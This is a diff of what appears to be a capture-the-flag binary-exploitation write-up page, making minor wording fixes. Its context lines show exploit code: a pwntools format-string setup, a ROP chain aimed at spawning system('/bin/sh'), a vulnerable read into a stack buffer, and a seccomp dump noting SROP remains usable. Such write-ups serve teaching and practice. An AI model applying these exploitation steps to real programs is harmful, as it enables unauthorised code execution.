@@ -72,7 +72,7 @@ def send_payload&#40;payload&#41;:
     answer_continue&#40;conn, True&#41;
     return response
 
-format_string &#61; FmtStr&#40;execute_fmt&#61;send_payload&#41;</code></pre> <p>Since RELRO is enabled, we use the write primitive to place a simple ROP-chain below our current stack frame, which will execute <code>system&#40;&quot;/bin/sh&quot;&#41;</code> whe nthe function returns.</p> <pre><code class=language-python >system &#61; libc.symbols.system
+format_string &#61; FmtStr&#40;execute_fmt&#61;send_payload&#41;</code></pre> <p>Since RELRO is enabled, we use the write primitive to place a simple ROP-chain below our current stack frame, which will execute <code>system&#40;&quot;/bin/sh&quot;&#41;</code> when the function returns.</p> <pre><code class=language-python >system &#61; libc.symbols.system
 binsh &#61; list&#40;libc.search&#40;b&quot;/bin/sh&quot;&#41;&#41;&#91;0&#93;
 rop &#61; ROP&#40;libc&#41;
 chain &#61; b&quot;&quot;
@@ -100,7 +100,7 @@ conn.interactive&#40;&#41;
   
   read&#40;0,buf,300&#41;;
   return;
-&#125;</code></pre> <p>Prior to <code>vuln&#40;&#41;</code> being called, the program will also open a file descriptor to the flag file as well as set a SECCOMP filter which restricts a lot of syscalls. Crucially however, <code>rt_sigreturn</code> is allowed by the filter so SROP techniques are still available to us.</p> <pre><code class=language-bash >❯ seccomp-tools dump ./chal 
+&#125;</code></pre> <p>Prior to <code>vuln&#40;&#41;</code> being called, the program will also open a file descriptor to the flag file as well as set a SECCOMP filter which restricts a lot of syscalls. However, <code>rt_sigreturn</code> is allowed by the filter so SROP techniques are still available to us.</p> <pre><code class=language-bash >❯ seccomp-tools dump ./chal 
 freakbob calling,pickup&#33;
  line  CODE  JT   JF      K
 &#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;
